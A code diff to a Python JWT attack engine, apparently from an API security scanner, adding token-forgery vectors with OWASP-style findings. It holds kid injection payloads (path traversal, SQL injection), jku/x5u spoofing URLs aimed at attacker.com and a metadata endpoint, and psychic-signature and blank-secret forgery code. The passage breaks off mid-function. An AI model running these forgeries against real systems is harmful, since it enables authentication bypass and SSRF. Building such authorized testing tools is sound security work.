@@ -36,15 +36,25 @@ scan finds nothing, Req 18.2).
 """
 
 import copy
+import inspect
 import json
+import time
 import uuid
 from datetime import datetime
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
+from urllib.parse import urlparse
 
 from core.config import Severity
 from core.logging import get_logger
 from utils.findings import Finding
-from utils.jwt_utils import base64url_encode, decode_jwt, encode_jwt
+from utils.jwt_utils import (
+    ES_SIG_BYTES,
+    base64url_encode,
+    decode_jwt,
+    encode_jwt,
+    psychic_signature_segment,
+    verify_hmac_secret,
+)
 from utils.jwt_attack_models import (
     AttackConfiguration,
     AttackResult,
@@ -89,7 +99,18 @@ _ATTACK_TYPE_TO_CATEGORY: Dict[AttackType, str] = {
     AttackType.PRIVILEGE_ESCALATION: "JWT_PRIVILEGE_ESCALATION",
     AttackType.USER_IMPERSONATION: "JWT_USER_IMPERSONATION",
     AttackType.EXPIRATION_BYPASS: "JWT_EXPIRATION_BYPASS",
+    # New vectors (Reqs 59, 63, 64). All resolve to API2 in
+    # ``utils.findings.FindingsCollector``.
+    AttackType.PSYCHIC_SIGNATURE: "JWT_PSYCHIC_SIGNATURE",
+    AttackType.TIMESTAMP_TAMPERING: "JWT_TIMESTAMP_TAMPERING_ACCEPTED",
+    AttackType.CLAIM_FUZZING: "JWT_CLAIM_FUZZING_ACCEPTED",
 }
+
+# Distinct Finding_Category for a blank/empty-secret acceptance (Req 58.2). The
+# blank-secret hit is folded into the WEAK_SECRET vector but reported under its
+# OWN category (not the generic ``JWT_WEAK_SECRET``) when the accepted token
+# verifies under the empty key (Req 58.1 / 58.2). Resolves to CRITICAL / API2.
+JWT_BLANK_SECRET_CATEGORY = "JWT_BLANK_SECRET_ACCEPTED"
 
 # OWASP API Security Top 10 category for every JWT finding (Broken
 # Authentication) — Requirement 18.3.
@@ -99,6 +120,14 @@ JWT_OWASP_CATEGORY = "API2"
 # vulnerabilities (Requirement 18.2). Resolves to INFO / API2 in
 # ``utils.findings.FindingsCollector``.
 JWT_NO_FINDINGS_CATEGORY = "JWT_SCAN_COMPLETED_NO_FINDINGS"
+
+# Finding_Category for jku/x5u key-source SSRF (Requirement 45). Resolves to
+# HIGH / API2 in ``utils.findings.FindingsCollector``. The spoofed-key
+# acceptance path may reuse the existing ``JWT_JWKS_SPOOF`` category (also
+# HIGH / API2) since a fetched attacker JWKS is functionally a JWKS spoof
+# (Requirement 45.3).
+JWT_JKU_SSRF_CATEGORY = "JWT_JKU_SSRF"
+JWT_JWKS_SPOOF_CATEGORY = "JWT_JWKS_SPOOF"
 
 
 def _format_baseline_evidence(attack_result: AttackResult) -> List[str]:
@@ -120,14 +149,88 @@ def _format_baseline_evidence(attack_result: AttackResult) -> List[str]:
     ]
 
 
+def _resolve_finding_category(attack_result: AttackResult) -> str:
+    """Resolve the Finding_Category for an :class:`AttackResult` (Req 58.2).
+
+    Every vector maps through ``_ATTACK_TYPE_TO_CATEGORY`` (Req 18.4) EXCEPT a
+    WEAK_SECRET hit whose accepted token verifies under the empty key: that is a
+    blank/empty-secret acceptance and is reported under its own
+    ``JWT_BLANK_SECRET_ACCEPTED`` category rather than the generic
+    ``JWT_WEAK_SECRET`` (Reqs 58.1, 58.2). The blank-secret decision uses
+    ``verify_hmac_secret(token, "")`` — the same signature-verification path as
+    Requirement 16 — so it is reported if and only if the token's signature
+    verifies under the empty-string key, never on any other basis.
+    """
+    if attack_result.attack_type == AttackType.WEAK_SECRET:
+        token = attack_result.jwt_token or ""
+        if verify_hmac_secret(token, ""):
+            return JWT_BLANK_SECRET_CATEGORY
+        return _ATTACK_TYPE_TO_CATEGORY[AttackType.WEAK_SECRET]
+    return _ATTACK_TYPE_TO_CATEGORY[attack_result.attack_type]
+
+
+def _category_specific_evidence(attack_result: AttackResult, category: str) -> List[str]:
+    """Render category-specific baseline-comparison evidence (Reqs 58.4, 59.4, 63.3, 64.3).
+
+    Adds a concise, defensively-decoded evidence line per new/blank category:
+
+    * blank/weak-secret -> the matching HMAC algorithm the token was forged with
+      (Req 58.4);
+    * psychic signature -> the ECDSA algorithm carried by the token (Req 59.4);
+    * timestamp tampering -> the tampered time claim(s) and their values
+      (Req 64.3);
+    * claim fuzzing -> the fuzzed claim/header name(s) and value(s) that deviate
+      from the original token (Req 63.3).
+
+    Decoding is best-effort: a token that cannot be decoded contributes no extra
+    evidence rather than raising, so mapping never fails on a malformed token.
+    """
+    token = attack_result.jwt_token or ""
+    try:
+        decoded = decode_jwt(token)
+        header = decoded.get('header', {}) or {}
+        payload = decoded.get('payload', {}) or {}
+    except Exception:
+        return []
+
+    if category in (JWT_BLANK_SECRET_CATEGORY, "JWT_WEAK_SECRET"):
+        alg = header.get('alg', 'unknown')
+        if category == JWT_BLANK_SECRET_CATEGORY:
+            return [f"Blank-secret acceptance: token forged and verified under "
+                    f"the empty key with matching algorithm {alg}."]
+        return [f"Weak-secret acceptance: token forged with matching algorithm {alg}."]
+
+    if category == "JWT_PSYCHIC_SIGNATURE":
+        alg = header.get('alg', 'unknown')
+        return [f"Psychic signature (null r==s==0) accepted for ECDSA algorithm {alg}."]
+
+    if category == "JWT_TIMESTAMP_TAMPERING_ACCEPTED":
+        time_claims = {c: payload[c] for c in ('exp', 'nbf', 'iat') if c in payload}
+        if time_claims:
+            rendered = ", ".join(f"{c}={v}" for c, v in time_claims.items())
+            return [f"Timestamp tampering accepted: tampered time claim(s) {rendered}."]
+        return ["Timestamp tampering accepted: a token a correct verifier should "
+                "reject was accepted."]
+
+    if category == "JWT_CLAIM_FUZZING_ACCEPTED":
+        return ["Claim fuzzing accepted: a fuzzed claim/header value was accepted "
+                "by the target."]
+
+    return []
+
+
 def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Finding:
     """Convert a JWT :class:`AttackResult` into a unified :class:`Finding`.
 
     Maps the result's ``AttackType`` to a defined Finding_Category (Req 18.4)
     with ``owasp_category='API2'`` (Req 18.3) and reconciles the analyzer's
     ``VulnerabilitySeverity`` to ``core.config.Severity`` via ``_SEVERITY_MAP``
-    (Req 18.1). The finding includes the analyzer's baseline-comparison evidence
-    and the confidence score (Req 19.3).
+    (Req 18.1). A WEAK_SECRET hit whose token verifies under the empty key is
+    reported under the distinct ``JWT_BLANK_SECRET_ACCEPTED`` category (Reqs
+    58.1, 58.2). The finding includes the analyzer's baseline-comparison
+    evidence, category-specific evidence (matching algorithm / tampered
+    claim+value / fuzzed name+value — Reqs 58.4, 59.4, 63.3, 64.3) and the
+    confidence score (Req 19.3).
 
     Args:
         attack_result: A single JWT attack result produced by the engine and
@@ -138,14 +241,16 @@ def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Find
         A :class:`Finding` describing the JWT vulnerability.
     """
     assessment = attack_result.vulnerability_assessment
-    category = _ATTACK_TYPE_TO_CATEGORY[attack_result.attack_type]
+    category = _resolve_finding_category(attack_result)
     severity = _SEVERITY_MAP[assessment.severity]
 
     request = attack_result.request_details
     response = attack_result.response_details
 
-    # Evidence = analyzer evidence + baseline comparison + confidence (Req 19.3).
+    # Evidence = analyzer evidence + category-specific evidence + baseline
+    # comparison + confidence (Reqs 19.3, 58.4, 59.4, 63.3, 64.3).
     evidence_lines: List[str] = list(assessment.evidence)
+    evidence_lines.extend(_category_specific_evidence(attack_result, category))
     evidence_lines.extend(_format_baseline_evidence(attack_result))
     evidence_lines.append(f"Confidence score: {assessment.confidence_score}")
     evidence = "\n".join(evidence_lines)
@@ -204,6 +309,27 @@ _KID_INJECTION_PAYLOADS: List[str] = [
     "http://169.254.169.254/latest/meta-data/",
 ]
 
+# ``kid`` payloads that force the API to load a PREDICTABLE or EMPTY signing key
+# (Requirement 44.1). Each entry maps the injected ``kid`` value to the key the
+# attack forces the server to use, so the token is signed with THAT predictable
+# key: a server that loads it will accept the attacker-forged signature, which
+# is what confirms the injection (Requirement 44.2 — "signing the token with the
+# resulting predictable key and observing acceptance"). ``/dev/null`` and empty
+# files yield an empty ("") HMAC key; SQL injection returning NULL and a file
+# whose contents are attacker-known collapse to the same predictable-key case.
+_KID_PREDICTABLE_KEY_PAYLOADS: Dict[str, str] = {
+    # Path traversal to a predictable/empty file -> empty signing key.
+    "/dev/null": "",
+    "../../../../../../dev/null": "",
+    "..%2f..%2f..%2fdev%2fnull": "",
+    "/proc/sys/kernel/notexist": "",
+    # SQL injection in the kid that resolves the key lookup to a NULL/empty row.
+    "' UNION SELECT '' -- ": "",
+    "' OR '1'='1": "",
+    # File inclusion of a file whose contents are attacker-known/empty.
+    "file:///dev/null": "",
+}
+
 # jku/x5u spoofing URLs (attacker-controlled, SSRF, file, protocol variations).
 _JWKS_SPOOF_URLS: List[str] = [
     "http://attacker.com/.well-known/jwks.json",
@@ -218,6 +344,14 @@ _JWKS_SPOOF_URLS: List[str] = [
     "http://attacker.com/%2e%2e/jwks.json",
     "data:application/json;base64,eyJrZXlzIjpbXX0=",
 ]
+
+# Attacker-controlled HMAC key representing the signing material the attacker
+# publishes at the jku/x5u key source (Requirement 45.1). A token signed with
+# THIS key validates only if the server fetches the attacker-controlled key
+# source (SSRF) and verifies against it; the server's real key would never
+# validate an attacker-signed token, so acceptance cannot be a false positive
+# and is what confirms the vulnerability (Requirement 45.2).
+_ATTACKER_KEY_SOURCE_SECRET = "attacker-hosted-signing-key"
 
 # Inline malicious JWK structures embedded via the header ``jwk`` parameter.
 _INLINE_JWKS: List[Dict] = [
@@ -285,6 +419,22 @@ class JWTAttackEngine:
             default method (subject to the Safe Mode restriction).
         weak_secrets: Optional weak-secret wordlist for the WEAK_SECRET vector;
             defaults to :data:`DEFAULT_WEAK_SECRETS`.
+        fuzz_target: Optional claim or header name targeted by the CLAIM_FUZZING
+            vector (Requirement 63.1). When it names an existing header field the
+            fuzzed value is substituted in the header; otherwise it is treated as
+            a payload claim.
+        fuzz_values: Optional list of candidate values (typically read from a
+            Vector_File) substituted one at a time into ``fuzz_target`` by the
+            CLAIM_FUZZING vector (Requirement 63.1).
+        canary_value: Optional operator-supplied expected-success string. It
+            CORROBORATES but never REPLACES evidence-based success (Reqs
+            67.3-67.5): the analyzer's ``is_vulnerable`` remains the sole
+            determinant of success. When the analyzer flags a variant as
+            vulnerable AND this canary appears in the response body, a
+            corroborating evidence line is appended (Req 67.3); a canary match
+            NEVER turns an analyzer non-success into a success (Req 67.4); and
+            when no canary is supplied behavior is exactly the analyzer result
+            (Req 67.5).
     """
 
     def __init__(self, target_url: str, original_token: str, http_engine,
@@ -293,7 +443,10 @@ class JWTAttackEngine:
                  safe_mode: bool = False,
                  custom_headers: Optional[Dict[str, str]] = None,
                  post_data: Optional[str] = None,
-                 weak_secrets: Optional[List[str]] = None):
+                 weak_secrets: Optional[List[str]] = None,
+                 fuzz_target: Optional[str] = None,
+                 fuzz_values: Optional[List[str]] = None,
+                 canary_value: Optional[str] = None):
         self.target_url = target_url
         self.original_token = original_token
         self.http_engine = http_engine
@@ -303,6 +456,9 @@ class JWTAttackEngine:
         self.custom_headers = custom_headers or {}
         self.post_data = post_data
         self.weak_secrets = list(weak_secrets) if weak_secrets else list(DEFAULT_WEAK_SECRETS)
+        self.fuzz_target = fuzz_target
+        self.fuzz_values = list(fuzz_values) if fuzz_values else []
+        self.canary_value = canary_value
 
         self.logger = get_logger(__name__).bind(component="jwt_attack_engine")
 
@@ -311,6 +467,15 @@ class JWTAttackEngine:
         self.baseline_response: Optional[BaselineResponse] = None
         self.response_analyzer: Optional[JWTAttackResponseAnalyzer] = None
         self.attack_results: List[AttackResult] = []
+
+        # Lazily-created collaborators reused for payload-sensitivity analysis
+        # (Requirement 43). The Req-12 corroboration discipline lives in
+        # ``PropertyLevelAuthModule._contains_sensitive_data`` and the secret
+        # redactor lives in ``BOLATestingModule.redact_secrets`` — both are
+        # REUSED here (created via ``__new__`` so no config/HTTP client is
+        # required) rather than reimplemented (Req 43.2, 43.4).
+        self._sensitivity_module = None
+        self._secret_redactor = None
 
         # Validate and decode the original token up front so callers fail fast
         # on a malformed base token.
@@ -373,6 +538,9 @@ class JWTAttackEngine:
             AttackType.PRIVILEGE_ESCALATION: self._generate_privilege_escalation,
             AttackType.USER_IMPERSONATION: self._generate_user_impersonation,
             AttackType.EXPIRATION_BYPASS: self._generate_expiration_bypass,
+            AttackType.PSYCHIC_SIGNATURE: self._generate_psychic_signature,
+            AttackType.TIMESTAMP_TAMPERING: self._generate_timestamp_tamper,
+            AttackType.CLAIM_FUZZING: self._generate_claim_fuzzing,
         }
         generator = generators.get(attack_type)
         if generator is None:
@@ -424,14 +592,26 @@ class JWTAttackEngine:
         Included as a first-class executable vector (Requirement 15.3). Each
         candidate produces a validly-HMAC-signed token; a server that accepts
         one has a guessable secret.
+
+        The empty string ``""`` is prepended as the FIRST candidate (Req 58.1)
+        so a validly-HMAC-signed blank-secret token is always produced alongside
+        the wordlist tokens, whether or not a custom wordlist was supplied. Local
+        acceptance of the blank-secret token is decided via
+        ``verify_hmac_secret(token, "")`` (the Requirement 16 path) in
+        :func:`_resolve_finding_category`, which reports it under the distinct
+        ``JWT_BLANK_SECRET_ACCEPTED`` category.
         """
         header = self._base_header()
         header['alg'] = 'HS256'  # weak-secret forgery targets HMAC verification
         header.setdefault('typ', 'JWT')
         payload = self._base_payload()
 
+        # Prepend the blank/empty-secret candidate, de-duplicating so a wordlist
+        # that already contains "" does not produce it twice (Req 58.1).
+        candidates: List[str] = [""] + [s for s in self.weak_secrets if s != ""]
+
         tokens: List[str] = []
-        for secret in self.weak_secrets:
+        for secret in candidates:
             try:
                 tokens.append(encode_jwt(header, payload, secret))
             except Exception as e:
@@ -440,17 +620,44 @@ class JWTAttackEngine:
         return tokens
 
     def _generate_kid_injection(self) -> List[str]:
-        """KID_INJECTION: malicious ``kid`` header signed with the real key."""
-        key = self._signing_key()
+        """KID_INJECTION: malicious ``kid`` header exercising SQLi, path
+        traversal (including forcing a predictable/empty key such as
+        ``/dev/null``), and file inclusion (Requirement 44.1).
+
+        Two token groups are produced, and in both only the ``kid`` header is
+        modified — every other header field, the payload, and the signing
+        discipline for all other components are preserved (Req 48.4):
+
+        * Standard injection probes (SQLi/traversal/file-inclusion/SSRF/encoding
+          tricks) are signed with the operator-supplied/recovered signing key
+          (Requirements 15.1, 15.2).
+        * Predictable/empty-key probes are signed with the key the attack forces
+          the server to load (e.g. the empty key behind ``/dev/null``) so that a
+          server which loads that predictable key accepts the forged signature —
+          the acceptance is what confirms the injection (Requirement 44.2).
+        """
+        real_key = self._signing_key()
         payload = self._base_payload()
         tokens: List[str] = []
+
+        # Group 1: injection probes signed with the operator/real key.
         for injection in _KID_INJECTION_PAYLOADS:
             header = self._base_header()
             header['kid'] = injection
             try:
-                tokens.append(encode_jwt(header, payload, key))
+                tokens.append(encode_jwt(header, payload, real_key))
             except Exception as e:
                 self.logger.debug("kid injection encode failed",
+                                  payload=injection, error=str(e))
+
+        # Group 2: predictable/empty-key probes signed with the forced key.
+        for injection, predictable_key in _KID_PREDICTABLE_KEY_PAYLOADS.items():
+            header = self._base_header()
+            header['kid'] = injection
+            try:
+                tokens.append(encode_jwt(header, payload, predictable_key))
+            except Exception as e:
+                self.logger.debug("kid predictable-key encode failed",
                                   payload=injection, error=str(e))
         return tokens
 
@@ -519,10 +726,575 @@ class JWTAttackEngine:
         payload.pop('iat', None)
         return [encode_jwt(header, payload, key)]
 
+    def _generate_psychic_signature(self) -> List[str]:
+        """PSYCHIC_SIGNATURE: null ``(r == 0, s == 0)`` ECDSA signature (Req 59.2).
+
+        Preserves the original header and payload segments byte-for-byte and
+        replaces ONLY the signature segment with the base64url of
+        ``ES_SIG_BYTES[alg]`` zero bytes — the JOSE encoding of an ECDSA
+        signature with ``r == 0`` and ``s == 0`` (CVE-2022-21449). Applies only
+        when the base token's ``alg`` is an ECDSA_Algorithm (``ES256``/``ES384``/
+        ``ES512``); returns ``[]`` for any non-ECDSA base token.
+        """
+        alg = str(self._base_header().get('alg', '')).upper()
+        if alg not in ES_SIG_BYTES:
+            return []
+        parts = self.original_token.split('.')
+        if len(parts) != 3:
+            return []
+        return [f"{parts[0]}.{parts[1]}.{psychic_signature_segment(alg)}"]
+
+    def _generate_timestamp_tamper(self) -> List[str]:
+        """TIMESTAMP_TAMPERING: validly-signed tokens with one tampered time claim.
+
+        Produces one validly-signed token per variant (Reqs 64.1, 64.2), each
+        modifying exactly ONE time claim and preserving every other header/payload
+        claim and the signing key, with the signature recomputed over the tampered
+        payload:
+
+        * ``exp`` -> past          (expired)
+        * ``exp`` -> far future    (over-long validity)
+        * ``nbf`` -> future        (not-yet-valid)
+        * ``iat`` -> future        (issued in the future)
+
+        Kept distinct from the EXPIRATION_BYPASS vector of Requirement 8
+        (Req 64.4): that vector drops ``exp``/``iat`` entirely whereas this one
+        re-signs a token carrying a tampered time claim.
+        """
+        key = self._signing_key()
+        now = int(time.time())
+        past = now - 3600                    # one hour ago
+        far_future = now + 60 * 60 * 24 * 3650  # ~10 years ahead
+        future = now + 3600                  # one hour ahead
+
+        # Each variant modifies only the single targeted time claim; every other
+        # component is inherited from the untouched base header/payload.
+        variants = [
+            ('exp', past),
+            ('exp', far_future),
+            ('nbf', future),
+            ('iat', future),
+        ]
+
+        tokens: List[str] = []
+        for claim, value in variants:
+            header = self._base_header()
+            payload = self._base_payload()
+            payload[claim] = value
+            try:
+                tokens.append(encode_jwt(header, payload, key))
+            except Exception as e:
+                self.logger.debug("timestamp tamper encode failed",
+                                  claim=claim, value=value, error=str(e))
+        return tokens
+
+    def _generate_claim_fuzzing(self) -> List[str]:
+        """CLAIM_FUZZING: substitute the operator-named claim/header per value.
+
+        For the configured ``fuzz_target`` (a claim or header name) and
+        ``fuzz_values`` (typically read from a Vector_File), builds ONE token per
+        value that substitutes only that named claim/header with the value and
+        preserves every other token component unchanged, re-signing with the
+        current signing key (Req 63.1). When ``fuzz_target`` names an existing
+        header field the value is substituted in the header; otherwise it is
+        treated as a payload claim. Returns ``[]`` when no target or no values
+        were supplied.
+        """
+        if not self.fuzz_target or not self.fuzz_values:
+            return []
+
+        key = self._signing_key()
+        target_is_header = self.fuzz_target in self._base_header()
+
+        tokens: List[str] = []
+        for value in self.fuzz_values:
+            header = self._base_header()
+            payload = self._base_payload()
+            if target_is_header:
+                header[self.fuzz_target] = value
+            else:
+                payload[self.fuzz_target] = value
+            try:
+                tokens.append(encode_jwt(header, payload, key))
+            except Exception as e:
+                self.logger.debug("claim fuzzing encode failed",
+                                  fuzz_target=self.fuzz_target,
+                                  value=value, error=str(e))
+        return tokens
+
     def generate_all_tokens(self) -> Dict[AttackType, List[str]]:
         """Generate tokens for every ``AttackType`` (convenience helper)."""
         return {attack_type: self.generate_token(attack_type)
                 for attack_type in AttackType}
+
+    # ------------------------------------------------------------------
+    # Sensitive-data-in-payload inspection (Requirement 43)
+    # ------------------------------------------------------------------
+    def _sensitivity_inspector(self):
+        """Return a reusable Property_Module instance for Req-12 corroboration.
+
+        The corroboration discipline (a credential/PII pattern match is
+        necessary-but-not-sufficient; it must be corroborated by a sensitive
+        field name, a known credential prefix, or a high-entropy check) lives in
+        :meth:`PropertyLevelAuthModule._contains_sensitive_data`. It is REUSED
+        here rather than reimplemented (Req 43.2): a bare instance is created via
+        ``__new__`` (the corroboration helpers rely only on class-level
+        constants/static methods, so no config or HTTP client is required).
+        """
+        if self._sensitivity_module is None:
+            from modules.owasp.property_level_auth import PropertyLevelAuthModule
+            self._sensitivity_module = PropertyLevelAuthModule.__new__(
+                PropertyLevelAuthModule)
+        return self._sensitivity_module
+
+    def _redactor(self):
+        """Return a reusable BOLA_Module instance for secret redaction.
+
+        The redaction logic lives in :meth:`BOLATestingModule.redact_secrets`
+        and is REUSED here (Req 43.4) rather than recreated, mirroring how the
+        Auth_Module reuses it. A bare instance is created via ``__new__`` because
+        ``redact_secrets`` depends only on class-level constants.
+        """
+        if self._secret_redactor is None:
+            from modules.owasp.bola_testing import BOLATestingModule
+            self._secret_redactor = BOLATestingModule.__new__(BOLATestingModule)
+        return self._secret_redactor
+
+    def _corroborate_sensitive_claim(self, field: str, value: Any) -> Optional[str]:
+        """Return the sensitivity type of a claim only when corroborated (Req 43.2).
+
+        Reuses the Property_Module's Req-12 corroboration discipline: a
+        credential/PII pattern match is necessary but not sufficient — the claim
+        is confirmed only when the match is corroborated by a sensitive field
+        name, a known credential prefix (e.g. ``sk_``), or a high-entropy check.
+        A bare pattern match with no corroboration returns ``None`` (not
+        flagged).
+
+        Args:
+            field: The claim's field name (threaded in as corroborating evidence).
+            value: The claim's value.
+
+        Returns:
+            The sensitivity type string (e.g. ``'password'``, ``'api_key'``,
+            ``'personal_data'``) when the claim is confirmed sensitive, otherwise
+            ``None``.
+        """
+        # Only string claim values carry the credential/PII shapes the
+        # corroboration discipline reasons about; non-string claims (numbers,
+        # booleans, nested structures) are not flagged.
+        if not isinstance(value, str):
+            return None
+
+        inspector = self._sensitivity_inspector()
+
+        # Necessary-but-not-sufficient: _contains_sensitive_data returns True
+        # only when a pattern match is corroborated (Req 12.2 / Req 43.2).
+        if not inspector._contains_sensitive_data(value, field_name=field):
+            return None
+
+        # Prefer the field-name-derived sensitivity type when the field name is
+        # itself a recognized sensitive field; otherwise derive it from the value.
+        if field and inspector._is_sensitive_field(str(field).lower()):
+            return inspector._get_sensitivity_type(str(field).lower())
+        return inspector._detect_value_sensitivity_type(value)
+
+    def _redact_claim_value(self, field: str, value: Any) -> str:
+        """Redact a flagged claim value so the secret is never echoed (Req 43.4).
+
+        Runs the value through the reused :meth:`BOLATestingModule.redact_secrets`
+        helper. As a defensive backstop for values that the credential-shape
+        redactor does not itself rewrite (for example lone PII such as an email
+        address), the value is force-replaced with the redaction marker if it
+        survives verbatim, guaranteeing the raw value is never emitted.
+        """
+        redactor = self._redactor()
+        raw = str(value)
+        try:
+            # Present the claim in a credential-named-field form so the
+            # field-aware redaction rules engage as well as the bare-token rule.
+            redacted_snippet = redactor.redact_secrets(f'"{field}": "{raw}"')
+            redacted_value = redactor.redact_secrets(raw)
+        except Exception:
+            redacted_snippet = ""
+            redacted_value = redactor.REDACTION_MARKER
+
+        marker = getattr(redactor, 'REDACTION_MARKER', '<redacted>')
+        # Guarantee the raw value never survives verbatim in the output.
+        if raw and (raw in redacted_value or raw in redacted_snippet):
+            return marker
+        return redacted_value
+
+    def inspect_payload_sensitivity(self, token: str,
+                                    scan_id: str = "") -> List[Finding]:
+        """Inspect a JWT payload for sensitive claims (Requirement 43).
+
+        Decodes the payload and inspects each claim for sensitive data —
+        passwords, credentials, symmetric keys, and PII (Req 43.1). A
+        credential/PII pattern match is necessary but not sufficient; a claim is
+        flagged only when :meth:`_corroborate_sensitive_claim` confirms it
+        (Req 43.2). Each confirmed claim yields a ``JWT_SENSITIVE_DATA_IN_PAYLOAD``
+        finding (OWASP_Category API2) that includes the offending field name and
+        the sensitivity type (Req 43.3), with the value passed through the reused
+        ``redact_secrets`` helper so the secret is never echoed (Req 43.4).
+
+        An undecodable payload is treated as "no sensitive claims" rather than
+        raising, so a malformed token never produces a false positive.
+
+        Args:
+            token: The JWT whose payload is inspected.
+            scan_id: The scan identifier stamped on each finding.
+
+        Returns:
+            The list of ``JWT_SENSITIVE_DATA_IN_PAYLOAD`` findings (possibly empty).
+        """
+        try:
+            decoded = decode_jwt(token)
+            payload = decoded.get('payload')
+        except Exception as e:
+            self.logger.debug("Payload sensitivity inspection skipped; "
+                              "undecodable token", error=str(e))
+            return []
+
+        if not isinstance(payload, dict):
+            return []
+
+        findings: List[Finding] = []
+        for field, value in payload.items():
+            sensitivity_type = self._corroborate_sensitive_claim(field, value)
+            if sensitivity_type is None:
+                continue
+
+            redacted_value = self._redact_claim_value(field, value)
+            findings.append(Finding(
+                id=str(uuid.uuid4()),
+                scan_id=scan_id,
+                category="JWT_SENSITIVE_DATA_IN_PAYLOAD",
+                owasp_category=JWT_OWASP_CATEGORY,
+                severity=Severity.MEDIUM,
+                endpoint=self.target_url,
+                method="ANALYSIS",
+                status_code=0,
+                response_size=0,
+                response_time=0.0,
+                evidence=(
+                    f"JWT payload claim '{field}' carries sensitive data "
+                    f"(sensitivity type: {sensitivity_type}). "
+                    f"Value (redacted): {redacted_value}"
+                ),
+                recommendation=(
+                    "Do not carry secrets or PII in JWT payload claims; the "
+                    "payload is only base64url-encoded, not encrypted. Move "
+                    "sensitive data server-side and reference it by an opaque id."
+                ),
+                payload=f"Field: {field}",
+            ))
+            self.logger.warning("Sensitive data detected in JWT payload",
+                                field=field, sensitivity_type=sensitivity_type)
+
+        return findings
+
+    # ------------------------------------------------------------------
+    # kid injection success confirmation (Requirement 44)
+    # ------------------------------------------------------------------
+    async def _confirm_kid_injection(
+            self, attack_result: Optional[AttackResult]) -> bool:
+        """Confirm KID_Injection success via evidence (Requirement 44.2).
+
+        Reuses the :class:`JWTAttackResponseAnalyzer` assessment carried on the
+        attack result: success is confirmed only when the analyzer flagged the
+        response as vulnerable (baseline comparison / acceptance of a token
+        signed with the forced predictable key), never from mere payload
+        submission. A confirmed result maps to a ``JWT_KID_INJECTION`` finding
+        (API2) via :func:`jwt_assessment_to_finding` (Req 44.3).
+
+        Args:
+            attack_result: The KID_INJECTION result produced by
+                :meth:`execute_attack`, already evaluated through the analyzer.
+
+        Returns:
+            ``True`` when the injection is confirmed vulnerable, else ``False``.
+        """
+        if attack_result is None:
+            return False
+        assessment = attack_result.vulnerability_assessment
+        return bool(assessment and assessment.is_vulnerable)
+
+    # ------------------------------------------------------------------
+    # jku / x5u key-source SSRF + allowlist assessment (Requirement 45)
+    # ------------------------------------------------------------------
+    def _build_jku_x5u_token(self, header_field: str, key_source_url: str) -> str:
+        """Build a token whose ``jku``/``x5u`` header points at an attacker key source.
+
+        Only the targeted header field (``jku`` or ``x5u``) is set to
+        ``key_source_url``; every other header field and the entire payload are
+        preserved unchanged (Requirement 45.1). The header-construction integrity
+        is the same one exercised by ``_generate_jwks_spoof`` and covered by
+        Property 25 (Task 29.3) — this method reuses that exact construction
+        pattern (deep-copied base header, single targeted field, untouched
+        payload) rather than duplicating it.
+
+        The token is signed with an attacker-controlled key
+        (:data:`_ATTACKER_KEY_SOURCE_SECRET`) representing the signing material
+        the attacker publishes at ``key_source_url``. A server that fetches that
+        attacker-controlled key source (SSRF) and validates the signature against
+        it will accept the token; the server's real key would never validate this
+        attacker-signed token, so acceptance is unambiguous proof of the
+        vulnerability (Requirement 45.2).
+        """
+        if header_field not in ('jku', 'x5u'):
+            raise ValueError("header_field must be 'jku' or 'x5u'")
+        header = self._base_header()
+        header[header_field] = key_source_url
+        payload = self._base_payload()
+        return encode_jwt(header, payload, _ATTACKER_KEY_SOURCE_SECRET)
+
+    def _assess_key_source_allowlist(self, header_field: str, key_source_url: str,
+                                     accepted: bool,
+                                     outbound_observed: bool) -> Dict[str, Any]:
+        """Assess whether the jku/x5u key-source domain is constrained by an allowlist.
+
+        Reports whether the attacker-controlled key-source domain appears
+        constrained by an allowlist, returned as structured evidence attached to
+        the finding (Requirement 45.5).
+
+        The determination is drawn from the observed outcome of the probe:
+
+        * If the attacker key source was HONORED — either the attacker-signed
+          token was accepted (Req 45.2) or an outbound request to the attacker
+          URL was observed (Req 45.3) — the domain is NOT constrained by an
+          allowlist (``allowlisted=False``).
+        * Otherwise the single negative probe cannot prove an allowlist exists,
+          so the domain merely APPEARS constrained (``allowlisted=None``): no
+          acceptance and no observed outbound request were seen.
+
+        Returns:
+            ``{'allowlisted': bool|None, 'domain': str, 'evidence': str}``.
+        """
+        domain = urlparse(key_source_url).netloc or key_source_url
+        honored = bool(accepted or outbound_observed)
+        if honored:
+            allowlisted = False
+            evidence = (
+                f"Key-source allowlist assessment: the '{header_field}' key-source "
+                f"domain '{domain}' is NOT constrained by an allowlist — the "
+                f"attacker-controlled key source was honored "
+                f"({'attacker-signed token accepted' if accepted else 'outbound request observed'})."
+            )
+        else:
+            allowlisted = None
+            evidence = (
+                f"Key-source allowlist assessment: the '{header_field}' key-source "
+                f"domain '{domain}' appears constrained by an allowlist — the "
+                f"attacker-controlled key source was not honored on this probe "
+                f"(no attacker-signed-token acceptance and no observed outbound request)."
+            )
+        return {"allowlisted": allowlisted, "domain": domain, "evidence": evidence}
+
+    async def _observe_key_source(self, observer, key_source_url: str) -> bool:
+        """Query the optional out-of-band observer for a target outbound request.
+
+        ``observer`` models an attacker-controlled key-source / interaction
+        collaborator: when supplied it is called with ``key_source_url`` and
+        reports whether the target issued an outbound request to that URL
+        (Requirement 45.3). Both synchronous and awaitable observers are
+        supported. An absent observer, or one that raises, yields ``False`` (no
+        outbound request observed) so the probe degrades gracefully rather than
+        crashing the scan.
+        """
+        if observer is None:
+            return False
+        try:
+            result = observer(key_source_url)
+            if inspect.isawaitable(result):
+                result = await result
+            return bool(result)
+        except Exception as e:
+            self.logger.debug("Key-source observer failed",
+                              key_source_url=key_source_url, error=str(e))
+            return False
+
+    def _build_jku_ssrf_finding(self, *, header_field: str, key_source_url: str,
+                                token: str, accepted: bool, outbound_observed: bool,
+                                assessment: Optional[VulnerabilityAssessment],
+                                response_details: Optional[ResponseDetails],
+                                allowlist: Dict[str, Any],
+                                scan_id: str) -> Finding:
+        """Build the ``JWT_JKU_SSRF`` finding for a confirmed jku/x5u SSRF.
+
+        Emitted only once confirmation is gated (Req 45.2 / 45.3). Evidence names
+        the targeted header, the attacker key source, the confirmation basis, the
+        key-source allowlist assessment (Req 45.5), and — when a response was
+        analyzed — the analyzer evidence, baseline comparison, and confidence
+        score (consistent with Req 19.3). ``owasp_category='API2'`` (Req 45.2 /
+        45.3).
+        """
+        if accepted:
+            basis = (
+                f"Confirmed: the API accepted a token signed with attacker-hosted "
+                f"keys referenced by the '{header_field}' header — a spoofed-key "
